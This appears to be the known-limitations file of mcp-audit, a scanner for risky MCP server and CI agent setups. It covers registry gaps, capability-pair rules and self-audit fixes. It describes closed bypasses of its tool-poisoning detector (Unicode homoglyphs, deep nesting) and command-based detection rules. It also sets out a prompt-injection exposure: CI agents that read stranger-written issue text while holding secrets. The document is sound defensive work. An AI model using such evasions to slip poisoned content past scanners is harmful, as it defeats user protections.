**Bare package spec is recorded and resolved as `latest` (R59, latent).** `lock/resolve.py::_spec_as_written` returns the literal string `"latest"` for a bare package name (no version/range token in the launch command), and `resolve_package` then resolves it via `resolve_latest_version_info()` — the `/latest` dist-tag endpoint. But npm-package-arg itself does not treat a bare name as the `latest` tag: it types a bare name as range `*`, and npm ≥ 10's dist-tag fast path (`npm-pick-manifest`) skips a deprecated or `engines`-incompatible `latest` in favor of a satisfying alternative when one exists, while an explicit `@latest` selector returns the tagged manifest unconditionally regardless of deprecation or `engines`. So a bare spec and an explicit `@latest` are not the same selector, and mcp-audit's lock currently resolves both identically. Measured impact, attributed to Prachet Poddar on [#88](https://github.com/adudley78/mcp-audit/issues/88) (2026-09-13): across 250 MCP server root packages, `latest` deprecated 0/250; roots where a real `npx` install picks something other than `latest`: node 18.20.4 14/250, node 20.18.0 8/250, node 22.11.0 7/250, node 24.0.0 0/250 — the gap is real but small and shrinking as the ecosystem moves to newer Node LTS lines. Our own population looks worse in isolation: 11 of the 15 `@modelcontextprotocol/server-*` registry entries have a deprecated `latest` (see above), and for four checked version-by-version (github 13/13, slack 10/10, postgres 8/8, puppeteer 8/8) *every* published version is deprecated, so for those specifically the bare-vs-`@latest` divergence collapses (no clean lower version exists to fall back to either way). Given that, SC-005's precise claim is "the registry's `latest` for this package is deprecated," not "you will install a deprecated version" — the two coincide whenever no clean lower version exists, and diverge otherwise. Fix shape, deliberately not built in this window: first make `spec_as_written` record the bare form faithfully instead of coercing it to `"latest"`, so the lock file at least states what the config actually said; bare-form *resolution* semantics (whether to model npm's dist-tag fast path) are a separate, later decision — never a semver range resolver, which mcp-audit has already declined to build (see "mcp-audit does not implement semver range resolution anywhere" above). See `docs/decisions/ADR-0005-mcp-audit-lock.md`'s R59 addendum. Independent of the bare-spec
question, the R59 context fields matter even for an exact-pin root: running the same resolver over the
same 250 roots against the registry as of 2026-09-07 (rebuilt from publish timestamps) and as of 2026-09-17,
184 of 250 (73.6%) resolved to a different transitive package set with the corpus the same size (2,867 →
2,882 name@version pairs; resolver output, not a real install) — substitution inside `trees`, invisible to `servers` by design (Prachet
Poddar, [#88](https://github.com/adudley78/mcp-audit/issues/88), 2026-09-21; see the R62 addendum).

**CVE-2026-32211 (`@azure-devops/mcp`) not in registry.** NVD records the affected product as `azure_web_apps` (CPE `cpe:2.3:a:microsoft:azure_web_apps`), a fully-hosted service. Microsoft applied the fix server-side; there is no npm package version to pin or compare against. A registry entry with a pinnable `known_vulnerabilities` CVE would be misleading. Operators using the Azure DevOps MCP Server integration should check the MSRC advisory (CVE-2026-32211) directly.

**CVE-2026-15583 (Grafana MCP server) not in registry (2026-10-11).** Grafana's advisory fixes it in the Go server's release 0.17.1 (`X-Grafana-URL` confused deputy, CVSS 8.6). The PyPI package `mcp-grafana` (homepage `github.com/grafana/mcp-grafana`) uses a different version line (0.1.0–2.0.2) with no 0.17.x, so a `fixed_in` on that package would be a guess. Docker and binary installs are not matchable by the registry either. Check Grafana's advisory directly.

**`@toolbox-sdk/server` capabilities omit a conditional `shell_exec` (2026-10-11).** The registry records `["database", "network_out"]`. The Toolbox source also has a `dataform-compile-local` tool that runs a local `dataform` binary, but it runs only when a user configures it in `tools.yaml`. Recording `shell_exec` would make every Toolbox user trip shell-exec toxic-flow pairs for a tool almost none of them enable, so it is left out and noted here.

~~**No registry metadata enrichment.**~~ **Resolved 2026-04-23.** `RegistryEntry` now carries three optional metadata fields — `first_published` (ISO date), `weekly_downloads` (int), and `publisher_history` (ordered list of publisher accounts). Ten entries in `registry/known-servers.json` have been pre-populated with npm data. When a typosquatted or unknown package is flagged (SC-001/SC-002), the finding description now includes a pipe-delimited metadata blurb for the legitimate package (e.g. "first published: 2024-11-14 | weekly downloads: 42,800 | known publishers: anthropic-bot, modelcontextprotocol"). The `scripts/enrich_registry.py` maintainer script fetches live data from the npm registry API to keep metadata fresh without any network calls during scanning.

## Live connection (`--connect`)

**Tested against few servers.** The `--connect` feature has been tested against the official `@modelcontextprotocol/server-filesystem` server and, for STORY-0086, two Python test servers under `mcp` 1.27 and 2.3. Before STORY-0086, enumeration read only the first `tools/list` page and, under `mcp` 2.x, lost every tool's input schema (both fixed 2026-10-13). Behavior against the broader ecosystem of MCP servers (different transports, authentication requirements, non-standard handshakes) is unknown.

**Server stderr output leaks to terminal.** When `--connect` launches a stdio server, the server's stderr output (warnings, logs, startup messages) appears in the user's terminal interleaved with mcp-audit output. This should be captured and suppressed or redirected.

~~**No authentication support.**~~ **Resolved v0.6.0.** `scan --connect-token TOKEN` passes a Bearer token to SSE/HTTP servers. STDIO servers that require authentication via environment variables can be configured with `--env KEY=VALUE`. The gap tracker at line 640 of this file was already marked resolved; this prose entry was stale.

## Toxic flow analysis

**Capability tagging is authoritative-first, heuristic-fallback.** For packages present in `registry/known-servers.json` with a `RegistryEntry.capabilities` list, those tags are the single source of truth. For everything else (unknown packages, private forks, custom servers), capabilities are inferred from package names and keyword matching. A server with no matching keywords might have dangerous capabilities that aren't detected. Live enumeration via `--connect` improves this by analyzing actual tool names, but coverage depends on the registry being current and the keyword lists being comprehensive. The historical drift risk — where adding a server to `known-servers.json` did not grant it capability tags (resulting in silent regression to keyword-only tagging) — was closed on 2026-04-20 when capability data was migrated from the in-module `KNOWN_SERVERS` dict into the registry JSON; the dict remains as a deterministic fallback when no registry is injected.

**No weighting or scoring.** All toxic pairs of the same severity are treated equally. In practice, a filesystem + fetch combination on a developer laptop is less risky than a database + shell-exec combination on a production server. Context-aware risk scoring is not implemented.

**FILE_WRITE integrity axis (R37, 2026-09-08).** R35's dead-capability check flagged `FILE_WRITE` as a `SUSPECTED_GAP`: every `TOXIC_PAIRS`/`CAPABILITY_FLOWS` entry models one axis — confidentiality (does data leave?) — and never asks whether state can be changed or a change persists and later re-executes. R37 measured the gap before designing anything, against the live 50-entry registry:

- **Which entries declare `file_write`:** 3 of 50 — `@modelcontextprotocol/server-filesystem` (stated purpose is filesystem access), `@modelcontextprotocol/server-everything` (official kitchen-sink demo server, stated purpose is "exercise every capability"), and `docpull` (community docs-scraping tool; `network_out` + `file_write` declared, where writing is incidental — its own cache/packs — not the headline feature).
- **Candidate (a) `FILE_WRITE + NETWORK_OUT`:** 2 self-pair hits (`docpull` — the exact "fetch and persist" motivating case — and `server-everything`) but **60 cross-server pairs** in a mega-scan combining all 50 registry entries, almost entirely `server-filesystem` (generic, extremely common, "obviously that's what it does") paired against every one of the 21 `NETWORK_OUT`-capable entries. Heuristic-path-only tagging (no registry) still produced 13 cross-server hits, same shape. This is precisely the "permanent yellow banner" failure mode the task was designed to avoid: a filesystem server plus *any* network-capable server (an extremely common, benign combination) would fire regardless of where the filesystem server is scoped.
- **Candidate (b) `FILE_WRITE + SHELL_EXEC`:** 1 self-pair hit (`server-everything`, which is *supposed* to trip every rule) and 11 cross-server hits, dominated by entries already flagged elsewhere for unrelated CVEs (`@mcpjam/inspector`, `flowise`, `gemini-mcp-tool`) rather than an "obviously benign, why did this fire" server. Small numbers, low noise.
- **Candidate (c) `FILE_WRITE` alone, unconstrained write target:** could not be measured at all — `tag_server()` never inspects a server's configured directory argument, so "unconstrained" is not a computable property of the current capability model. This absence is itself the finding that decided Part 3 below.
- **False-positive shape:** for (a), the overwhelming majority of the 60 cross-server hits are the "yes, obviously that's what it does — so what?" case: a scoped filesystem server (e.g. the demo config's `/Users/demo/projects`) paired with a fetch server says nothing about whether the two ever interact, and nothing about where a write would land. For (b), the hits skew toward genuinely surprising, actionable combinations.

**Decision: narrow addition (Option C), not a full integrity axis.** `INTEG-001` (`FILE_WRITE + SHELL_EXEC`, "plant-then-execute") was added to a new `INTEGRITY_PAIRS` list in `analyzers/toxic_flow.py`, checked by the same `ToxicFlowAnalyzer.analyze_all()` self-pair/cross-pair mechanism as `TOXIC_PAIRS`, combined via `TOXIC_AND_INTEGRITY_PAIRS` (also consumed by `shadow/risk.py` and `diff/comparator.py`). It uses a distinct `INTEG-*` finding-ID prefix — never `TOXIC-*` — because exfiltration and integrity are different claims and a user filtering on one should not silently get the other. Severity (HIGH) is calibrated against `TOXIC-004` (`FILE_READ + SHELL_EXEC`, the closest structural analog: content reaches a shell-exec sink), not borrowed from an exfiltration pair — SHELL_EXEC's reach is not scoped by mcp-audit's capability model any more for a write than for a read, so the write-target problem below does not apply to this pair. `FILE_WRITE` is no longer in `KNOWN_TAG_ONLY_CAPABILITIES` — it now participates in a real detection path.

`FILE_WRITE + NETWORK_OUT` was explicitly **not** added, in either self-pair or cross-pair form, and is recorded here — not in the tag-only allowlist, since `FILE_WRITE` is no longer tag-only — as a known, **measured** gap distinct from a deliberate deferral like `CLOUD`: the pair's severity depends almost entirely on *where* the write lands (a scratch directory is nothing; `~/.claude/CLAUDE.md` or a shell rc file is critical), and mcp-audit's capability model has no notion of write target at all. Shipping one severity for two situations that differ by orders of magnitude was rejected as indefensible under this project's own severity-framework conventions ("shipping a severity we cannot defend is worse than shipping nothing").

**Write-target problem (Part 3 of R37) — investigated, found not cleanly available, not built.** `agent_files/discovery.py` does know the concrete set of agent-instruction relative paths it scans (`CLAUDE.md` tiers, `.claude/commands/*.md`, `.cursor/rules/*.mdc`, `.github/copilot-instructions.md`, `.github/instructions/*.instructions.md`, `.github/prompts/*.prompt.md`) — but only as literal path-construction logic inside its user-global and project-tree walk functions, not as a single importable constant. Even if that list were factored out, connecting it to a *server's* actual write scope would require new, unbuilt infrastructure: `tag_server()` never inspects a server's configured directory argument (e.g. the trailing path in `@modelcontextprotocol/server-filesystem <dir>`), so there is no existing signal for "is this server's write target inside/near a known agent-instruction path" to plug into. Building that inspector — parsing per-server-type directory arguments, reasoning about path containment, handling servers whose write path isn't visible in the config at all — is exactly the "filesystem-scope model" R37 was told not to invent in-task. Per the task's own fallback rule, an unavailable write-target connection means the answer is B or C, not A; this is why `FILE_WRITE + NETWORK_OUT` stays an open, measured gap rather than a shipped (and indefensible) severity. A future task that wants to close it should start by building that write-target inspector as its own measured piece of work, not by guessing a severity now.

**R39 follow-up: the path-list half of the blocker is now fixed; the harder half is not, and measuring it surfaced a second, sharper blocker.** `agent_files/discovery.py`'s relative-path list is now a single importable constant, `AGENT_INSTRUCTION_PATTERNS` (a tuple of `AgentInstructionPathPattern`), with a generic `_resolve_relative_pattern()` resolver; both `_discover_user_global()` and `_discover_project_tree()` are driven by it instead of a hand-written copy, and `discover_agent_files()`'s own test suite (50 tests, unchanged) passed against the refactor without modification — proof the behaviour didn't move. That closes the "not a single importable constant" half of the original blocker.

The other half — does a filesystem-class server's config *declare* its write scope, so severity could be read off the config instead of invented — was tested against every real/demo-representative config fixture in this repo (`demo/configs/claude_desktop_config.json`, `tests/fixtures/clean_with_credential.json`, `tests/fixtures/smoke_test_config.json`, `tests/fixtures/real_servers/official_mcp_servers.json`): **4 of 4 (100%)** declare at least one directory argument after the package name (`/Users/demo/projects`, `/Users/dev/projects`, `/tmp`, `/Users/dev/projects`), and the official `@modelcontextprotocol/server-filesystem` package's own documentation confirms those trailing args are exactly its access-control list. Taken alone, that looks like the hypothesis holding.

It does not unblock a rule, for two reasons the measurement itself surfaced:

1. **It only ever applies to one of the three `file_write`-capable registry entries.** `@modelcontextprotocol/server-everything` is a fixed kitchen-sink demo server with no directory-argument convention at all — it isn't scoped by args, it just is what it is. `docpull` writes to its own internal cache/pack location, not a user-supplied directory (per R37's Part 1 categorisation, this was already "incidental," not "stated purpose"). A rule keyed on "parse the trailing args as directories" is therefore a single-named-package special case, not a capability-based signal — it would need a hardcoded package-name allowlist to even know which servers' args to parse as paths at all, which is a different analyzer shape from every other check in `toxic_flow.py` (all of which are deliberately package-agnostic, keyed on capability tags alone).
2. **Absence of args does not mean "unconstrained."** `server-filesystem`'s own documentation (confirmed against its source, `src/filesystem/index.ts`) describes a second, independent way its write scope is set: the MCP **Roots** protocol, where a supporting client grants directories at runtime, invisible to a static config file. A server configured with zero directory args is not necessarily wide open — it may be fully scoped by Roots, or it may fail to start at all (the package throws if neither method supplies a directory). A rule that read "no args" as "unconstrained, therefore worse" would misclassify an unknown number of Roots-scoped or non-functional servers as maximally dangerous — precisely the "shipping a severity we cannot defend" trap R37 refused to walk into, now showing up on the *other* side of the same hypothesis.

**Decision: STEP 1 ships; STEP 3 (a new `INTEG-00x` write-target rule) is declined again, on new grounds.** The args-declare-scope hypothesis is real but too narrow (one package) and its negative case is genuinely ambiguous (Roots vs. unconstrained vs. non-functional) rather than cleanly "unconstrained" — the same shape of problem as Part 3 of R37, arrived at from the config-parsing side instead of the agent-path side. `FILE_WRITE + NETWORK_OUT` remains the open, measured gap recorded above. Closing it for real would need, at minimum, a way to distinguish "no args, Roots-capable client" from "no args, unconstrained" — which is a client-capability signal mcp-audit's static config scan does not and, being offline by design, structurally cannot have.

**Scope limitation: `INTEG-001` is not wired into multi-hop attack-path chaining.** `attack_paths.py`'s `CAPABILITY_FLOWS` graph (used for 3+ server chain discovery and the hitting-set/killchain recommendation engine) was deliberately left untouched — adding `FILE_WRITE` as a graph node there would require the same `(NETWORK_OUT, FILE_WRITE)` edge that was just rejected above for the identical write-target reason. `INTEG-001` therefore only fires as a direct two-server (or self-pair) `ToxicFlowAnalyzer` finding; `mcp-audit killchain` and the attack-path dashboard graph do not (yet) include integrity-axis multi-hop chains. `_candidates_from_toxic_findings()` in `attack_paths.py` silently skips any finding ID it doesn't recognise (including `INTEG-001`), which is the correct, safe default here but is worth knowing if `INTEG-001` findings seem to be missing from `mcp-audit killchain` output.

## Output formats

~~**Nucleus FlexConnect not validated.**~~ **Resolved 2026-04-23.** The FlexConnect output formatter has been validated end-to-end against a live Nucleus instance. The correct schema (top-level `assets` array + per-finding `host_name` field; `scan_type: "Host"`) was confirmed via live API round-trip. The `push-nucleus` command (`src/mcp_audit/cli/push_nucleus.py`) performs a multipart/form-data upload and polls the import job to completion. Both the formatter (`src/mcp_audit/output/nucleus.py`) and the push command have test coverage; the `scripts/validate_nucleus.py` regression script can be re-run against any Nucleus instance to re-validate.

~~**SARIF not tested with GitHub.**~~ **Resolved 2026-04-23.** The SARIF formatter now conforms to the SARIF 2.1.0 schema as validated by `tests/test_sarif_schema.py` (uses the official OASIS JSON schema via `jsonschema`). Key hardening applied: `originalUriBaseIds` added so GitHub's uploader can resolve `%SRCROOT%` to the repo root; `automationDetails.id` added for run deduplication in the Security tab; `file:///unknown` fallback replaced with the relative sentinel `"unknown"` (the invalid absolute URI caused GitHub to silently discard results). Manual verification against a live repository with Code Scanning enabled is documented in `docs/github-action.md` § "Testing the SARIF upload".

## Platform coverage

**~~Windows not tested (critical paths).~~  Partially resolved 2026-05-02 (STORY-0017).
Further resolved 2026-05-03 (STORY-0019).**
The `source-smoke` CI job now runs `scripts/smoke_test.py` on `windows-latest` on every
PR, covering: binary launch, discover, scan output, severity filter, SARIF, baseline
round-trip, watcher re-scan (ReadDirectoryChangesW), rug-pull two-scan (state written to
`%APPDATA%\mcp-audit\state\`), and canonical-path discovery (`%APPDATA%\Claude\…`).
Config discovery includes Windows paths. Extension discovery paths for VS Code, VS Code
Insiders, Cursor, and Windsurf are defined (STORY-0004, 2026-04-30) and unit-tested via
monkeypatching.

The new `synthetic-install.yml` CI workflow (STORY-0019) additionally runs
`tests/integration/test_synthetic_install.py` on `windows-latest` on every PR, validating:
all six supported clients' canonical config paths are discovered when `USERPROFILE` is
redirected to a temp tree; `scan` produces findings against a config with a known-bad
credential; paths with spaces and non-ASCII filenames are handled without crashes; the
Windows >260-char path edge case is handled gracefully (exit ≤ 2, no traceback); and the
`baseline save`/`compare` round-trip completes on non-ASCII paths.

Full end-to-end validation on a physical Windows host is still a manual step.

**~~Linux not tested (critical paths).~~  Partially resolved 2026-05-02 (STORY-0017).
Further resolved 2026-05-03 (STORY-0019).**
The `source-smoke` CI job also runs on `ubuntu-latest`, covering the same 11 smoke-test
steps with inotify-backed filesystem events and `~/.config/mcp-audit/state/` rug-pull
state. The existing `binary-smoke` job additionally validates the PyInstaller Linux binary.

The new `synthetic-install.yml` CI workflow (STORY-0019) additionally runs
`tests/integration/test_synthetic_install.py` on `ubuntu-latest`, validating the same
canonical-discovery, credential-finding, paths-with-spaces, non-ASCII, and baseline
round-trip scenarios on Linux. Config discovery and extension paths are defined but
end-to-end validation on non-Ubuntu Linux distributions is a manual step.

## Internal security findings

Self-audit conducted 2026-04-12. Criticals and highs were patched in commit `18bbf66`. The medium and low findings below are tracked for future hardening — normal for a prototype.

### Medium

**V-07: Resolved (2026-06-14).** Poisoning detection bypassed by Unicode homoglyphs. Correction: the earlier (2026-04-23) write-up claimed "all regex patterns now run against NFKD-normalized ASCII text" — that normalization was **not** actually implemented at the time; only the `POISON-060` character-class check existed and patterns matched raw bytes. The normalization is now real: `normalize_for_detection()` (in `analyzers/poisoning.py`) applies NFKD decomposition, strips combining marks (`Mn`) and format characters (`Cf`, incl. zero-width), and folds a minimal UTS #39 confusables map (Cyrillic / Greek / Armenian / Cherokee / Coptic) to ASCII. Literal patterns (POISON-010..030, HOOK-001/002, agent-file SKILL/MEM) match the normalized text; `POISON-060` fires on the original obfuscation character. Evidence retains the attacker's original bytes. CWE-116. See "Known detection evasions → Closed in the 2026-06-14 normalization pass".

**V-08: Resolved (2026-04-23).** Poisoning detection bypassed by nesting depth > 10. The recursion limit in `_extract_text_fields` and `_extract_description_fields` raised from 10 to 50. A depth of 50 guards against circular-reference DoS while making the bypass impractical.

**V-09: Resolved (2026-04-23).** `TRANSPORT-004` (HIGH, CWE-1327) added to `TransportAnalyzer`. Fires when the server URL hostname is `0.0.0.0`, `::`, `[::]`, `0:0:0:0:0:0:0:0`, or `[0:0:0:0:0:0:0:0]`. Wildcard bindings expose the server on all interfaces simultaneously — more dangerous than a specific remote host.

**V-10: Resolved (2026-04-23).** `TRANSPORT-002` privilege-escalation check expanded. Now catches `sudo`, `doas`, `pkexec`, `su`, `run0`, absolute paths to those binaries (e.g. `/usr/bin/sudo`, `/usr/local/bin/doas`), the `/usr/sbin/` prefix, and any of those names appearing as `args[0]` when the command is a shell (`sh`, `bash`, etc.).

**V-11: Resolved (2026-04-23).** `yarn dlx` detection added to both `TransportAnalyzer` and `SupplyChainAnalyzer`. `pipx` added to `_RUNTIME_FETCH_COMMANDS`. PyPI typosquatting for `uvx`/`pipx` packages requires a separate known-packages list for PyPI — tracked as a future supply-chain coverage gap.

**V-12: Resolved.** `httpx` moved from `dependencies` to the `mcp` optional group (`pip install 'mcp-audit-scanner[mcp]'`). It is not installed in the default distribution and carries no transitive attack surface for users who don't need live server connections.

### Low

**V-13: Resolved.** Version string centralized via `importlib.metadata` in `__init__.py` with consistency test.

**V-14: Resolved.** `pyproject.toml` license field set to `Apache-2.0`; classifiers aligned; LICENSE file created.

**V-15: Resolved.** All `yourusername` placeholder URLs replaced with `adudley78` across `sarif.py`, `pyproject.toml`, `README.md`, `scripts/install.sh`, and `docs/enterprise-deployment.md`.

~~**V-16: `_home()` inconsistency in discovery.py.**~~ **Resolved v0.9.2.** `_get_client_specs()` called `Path.home()` directly on the Windows branch (line 40), bypassing the `_home()` indirection used everywhere else. Fixed by replacing `Path.home()` with `_home()`. Regression test `TestHomeHelperConsistency::test_discovery_uses_home_helper` in `tests/test_discovery.py` patches `mcp_audit.discovery._home` and asserts all returned paths are under the patched root.

~~**V-17: Credential regex overlap and gaps.**~~ **Resolved v0.10.0 (STORY-0035).** Expanded `SECRET_PATTERNS` in `credentials.py` to cover GCP service-account JSON keys, Azure SAS tokens, DigitalOcean personal access tokens, Vercel access tokens, PEM private key blocks (RSA, EC, DSA, OpenSSH), HashiCorp Vault service and batch tokens, Anthropic API keys, and GitHub fine-grained PATs (`github_pat_`). Matching Semgrep rules added to both Python and TypeScript rule packs. 13 new unit tests added. Zero false positives confirmed against all demo config fixtures.

## Binary distribution

**Binary distribution is architecture-specific.** GitHub Releases ship four PyInstaller binaries built by `.github/actions/build-binary/` (CPython 3.12.14 via uv): `mcp-audit-darwin-x86_64`, `mcp-audit-darwin-arm64`, `mcp-audit-linux-x86_64`, `mcp-audit-windows-x86_64.exe`. CI `binary-smoke` and `release.yml` `build` both call that composite. There is no local `scripts/build-linux.sh` / `build.py` path — those used Python 3.11 + pip and skipped the specs' excludes.

**Linux binary requires a glibc host at runtime.** The linux artifact is built on GitHub-hosted `ubuntu-latest` with uv's standalone CPython 3.12.14, not Alpine/musl. Alpine and very old glibc hosts are unsupported.

**Linux binary is exercised in CI, not only via `file(1)`.** `binary-smoke` on `ubuntu-latest` builds the linux artifact with the same composite as release, inspects the PYZ, and runs `scripts/smoke_test.py`. Distro-specific config discovery and watcher behaviour outside that smoke are still a gap.

~~**Dashboard browser compatibility untested.**~~ **Resolved 2026-04-23.** `tests/test_dashboard_compat.py` covers Chromium, Firefox, and WebKit (Safari engine) headlessly via Playwright. Tests assert: no JS errors on load or dark-mode toggle, findings table present, SVG graph container present, self-contained HTML (no external CDN references), D3 v7 bundled inline, scan data JSON embedded. Browser tests are skipped gracefully when Playwright binaries are not installed; CI installs them on the `ubuntu-latest / 3.12` matrix leg. Mobile browsers and WebView-based environments (Electron, VS Code webview) are not covered.

## Licensing & distribution

**Fully open source — no paid tiers.** Apache 2.0; every feature ships in every build. All license-verification code, revocation lists, and the `activate` / `license` CLI commands were removed in v0.2.0.

**No telemetry or usage analytics.** By design. See `docs/telemetry.md` for
the full rationale and the bar any future opt-in change must clear.

## Scoring

**Score is computed before `--severity-threshold` filtering — intentional.**
`calculate_score()` in `scanner.py` runs against the complete finding set before
the CLI applies `--severity-threshold` filtering.  This means the score and grade
in JSON and SARIF output always reflect all findings regardless of the threshold
set by the operator.  Exit code and `has_findings` reflect only findings at or
above the threshold.  This is a deliberate design choice: the score is a property
of the configuration, not of the alerting threshold.  A practitioner who sets
`--severity-threshold HIGH` to reduce operational noise should still see the true
security posture in the JSON output.  See [docs/scoring.md](docs/scoring.md#scoring-and-severity-filtering)
for a concrete example and further rationale.

**INFO deductions are visible but cosmetically surprising.** INFO-severity findings produce a −1 deduction entry in the score breakdown. If positive signal bonuses (up to +10 total) exceed the total INFO deduction, the numeric score clamps to 100 even though deduction lines appear. The deduction entry is the intended signal to the practitioner. This is a known, accepted tradeoff — a clean scan with minor informational notes should still be achievable as a 100/A.

**Scoring weights are not user-configurable.** The deduction table and bonus thresholds are hardcoded in `scoring.py`. Custom severity weights are planned work but are not yet implemented.

## Baselines

**Server matching uses exact (client, name) pair — renames appear as remove+add.** `BaselineManager.compare()` identifies servers by the `(client, name)` tuple. If a server is renamed in the config file it will show as `server_removed` (old name) and `server_added` (new name) rather than as a single `hash_changed` finding. There is no fuzzy matching on server identity. This is intentional — fuzzy matching would increase false-negative rates — but users should be aware that renaming a server resets its history.

**Trend tracking (multi-baseline comparison) is not yet implemented.** The `BaselineManager` currently supports pairwise comparison (one baseline vs. current state) only. Historical trend views (e.g. "how has this server changed across 5 baselines") are not yet implemented.

## GitHub Action

~~**Action uses `pip install` rather than the PyInstaller binary.**~~ **Resolved.** `action.yml` delegates install to `./setup-action`, which downloads the prebuilt binary for the runner's OS and architecture from GitHub Releases and caches it by version, OS and architecture; no Python setup or `pip install` step remains (pinned by `tests/test_action_yaml.py`).

**Action not tested on self-hosted runners.** Self-hosted runners need outbound HTTPS to `github.com` for the binary download, the `gh` CLI when `version` is `latest` (the default), `bash` on every OS, plus `curl` (Linux/macOS) or PowerShell 7 `pwsh` (Windows), `python3` on `PATH` (see below), and one of the four OS/architecture pairs a release binary exists for (Linux/X64, macOS/X64, macOS/ARM64, Windows/X64); `setup-action` fails with an "Unsupported runner" error on anything else, for example Linux/ARM64. The prebuilt Linux binary is built on a glibc-based Ubuntu runner and is not tested on musl-based images such as Alpine. The scan, lock and diff steps use `python3` to read their own output. Without it the scan still runs and still fails the step on findings, but the outputs degrade quietly: `findings-count` is `0`, `grade` is `unknown`, `sarif-path` is empty, `LOCK-*` results are not merged into the SARIF file, and diff mode posts no PR comment.

**Action not tested on Windows runners.** The action's shell scripts use bash syntax (`set +e`, `ARGS="..."`, heredocs). GitHub-hosted Windows runners default to PowerShell. The action sets `shell: bash` on all steps to use the Git Bash environment that Windows runners include, but this path has not been validated end-to-end. File paths with backslashes may cause issues in `--path` arguments.

**config-paths input accepts only a single path.** The `config-paths` action input is documented as "single MCP config file path" and maps to `--path`. The underlying CLI `--path` accepts a single path. Supporting comma-separated multiple paths would require multiple `--path` invocations or a new `--paths` multi-value flag in `cli.py`. This is a known limitation.

## CI workflow agents (WORKFLOW-001..003, STORY-0091)

What `ci_workflows/` reads is in `docs/ci-workflows.md`. Known limits of what shipped:

- **Three actions only.** `anthropics/claude-code-action`, `anthropics/claude-code-security-review` and `google-github-actions/run-gemini-cli`, matched on exact `owner/repo` (an action in a subdirectory of those repositories does not match). Other agent actions, agents started from a `run:` step (for example `npx @anthropic-ai/claude-code -p ...`), and GitHub Agentic Workflows (`gh aw` markdown in `.github/workflows/*.md` and its compiled `.lock.yml`) are not read. Agentic Workflows has its own model (read-only agent job, writes through "safe outputs", a firewall) that needs its own rules. The Copilot coding agent is started by GitHub, not by a workflow; `copilot-setup-steps.yml` only prepares its runner, so there is nothing to check there.
- **`if:` conditions are not read.** A job limited to `github.event.pull_request.head.repo.fork == false` or to a commenter's `author_association` can still be reported. For `claude-code-action` this matters less: it already refuses users without write access unless `allowed_non_write_users` is set, and the finding names that input when it is. The agent still reads text that other people wrote (the issue body, earlier comments), which is why a write-access trigger is not treated as safe.
- **`allowed_non_write_users` alone does not raise a finding.** With `claude-code-action`'s default tools (file edits, commits, comments, no arbitrary shell) the step counts as limited even when that input lets anyone start it; the input is named in the finding only when the tools are also open. The action's own docs call that input a significant risk outside narrowly-permissioned workflows.
- **The repository's default token permission is not visible.** A job with no `permissions:` key is treated as possibly-write and the finding says so; on a repository whose default is read-only it is a false positive until a `permissions:` block makes that explicit.
- **Secrets are found only where the step can see them by name**: the step's `with:`/`env:`, the job's `env:` and the workflow's `env:`. A secret written to a file or a step output by an earlier step, OIDC-only setups (Bedrock, Vertex, Anthropic workload identity federation with no static key, where `id-token: write` is the credential), and `secrets: inherit` into a reusable workflow that does not name the secret are not seen. Whether a caller actually passes a reusable workflow its secrets is not checked.
- **Reusable workflows: local callers only.** A `workflow_call` workflow is checked once per caller path in the same repository (`uses: ./.github/workflows/<file>`, followed through chains up to GitHub's ten levels), each with that path's triggers and a token capped at every calling job's permissions along it; a step fires only when one path has both a stranger-writable trigger and a writable token. Callers in other repositories, and `workflow_run` chains, are not followed, so a reusable agent workflow with no local caller is silent. At most 32 distinct paths are kept per workflow.
- **Agents on other triggers that still read untrusted text are not reported.** A `schedule` or `workflow_dispatch` agent that reads open issues or pull requests, or a `workflow_run` agent that reads a fork's CI output or artifacts, takes stranger-written input with the repository's secrets, but its trigger is not on the list, and the file does not show what the prompt tells it to read.
- **Tool limits come from the inputs mcp-audit reads.** For Claude Code: `claude_args` (`--allowedTools`, `--disallowedTools`, `--dangerously-skip-permissions`, `--permission-mode`), the v0.x `allowed_tools`/`disallowed_tools` inputs, and `permissions` in an inline `settings` JSON. A `settings` file path, `--settings` inside `claude_args`, and the repository's own `.claude/settings.json` are not merged in. "Open" means every shell command or a HARNESS-005 broad command (`Bash(cat:*)`, `Bash(gh:*)`, interpreters, network tools); a narrow rule is treated as a real limit even though a file-reading tool can still read `.git/config` or `/proc` in some setups. For Gemini CLI: the `settings` input only (`tools.core`, `tools.exclude`, the pre-v2 `coreTools`/`excludeTools` spelling, `security.disableYoloMode`); a `settings` value that is not JSON gives no finding.
- **Version floors need an exact tag.** `run-gemini-cli@v0.1.21` is caught; a commit SHA pin cannot be mapped to a version offline and is not reported. Floating `@v0`/`@v0.1` tags resolve to a fixed release today and are not reported. `gemini_cli_version` set from a variable is not resolved.
- **Workspace trust is reported only after a visible pull-request checkout** (`actions/checkout` with a PR head ref or `refs/pull/`, `gh pr checkout`, or `git fetch`/`checkout` of such a ref in a `run:` step). Google's own examples set `GEMINI_CLI_TRUST_WORKSPACE` on a default-branch checkout, which is safe and is not reported. A checkout done another way is missed.
- **Symlinks and size.** A symlinked `.github` or `.github/workflows` is never read, and a workflow file is read only when it resolves inside the scanned directory, so a symlinked file pointing at another file in the same repository is still read. Files over 256 KiB, anything past 4 MiB (or 2,000 files) in one scan, and a workflow directory or file that cannot be read are skipped, and each is listed in the scan's errors. PyYAML's pure-Python safe loader is used on purpose (libyaml's composer recurses in C, so deep nesting could overflow the stack instead of raising); a repository built to parse slowly can make the workflow pass take about 45 seconds at the 4 MiB budget. Files that are not UTF-8 and YAML that does not parse (including anything with Python object tags) are skipped without an error message, as GitHub would not run them either.

## Fleet merge

~~**HTML fleet output is a simplified table, not a full D3 fleet dashboard.**~~ **Resolved v0.6.0.** `mcp-audit merge --format html` now produces a fully self-contained D3-powered fleet dashboard with a machine-card grid, filterable/sortable findings table, light/dark mode toggle, and severity breakdown bars — replacing the previous Rich-table HTML export. A full D3 force-directed fleet visualization (showing machine relationships, shared findings as edges, attack-path overlays) is still a future enhancement; the current dashboard shows per-machine cards but not cross-machine graph edges.

~~**`--dir` is non-recursive.**~~ **Resolved v0.5.1.** `_collect_json_paths_from_dir()` now uses `rglob("*.json")` instead of `glob("*.json")`, so nested subdirectory layouts (e.g. `./results/team-a/machine-1.json`) are collected automatically.

**Deduplication matches on exact `(analyzer, server_name, title)` triple.** Findings with subtly different titles — for example, two credential findings on the same server but matching different key names (`sk-abc123` vs `OPENAI_KEY=xyz`) — will produce two separate DeduplicatedFindings rather than being collapsed. This is intentional (exact-match deduplication avoids false-merges) but means the unique-findings count may be slightly inflated when the same issue class manifests with different evidence strings.

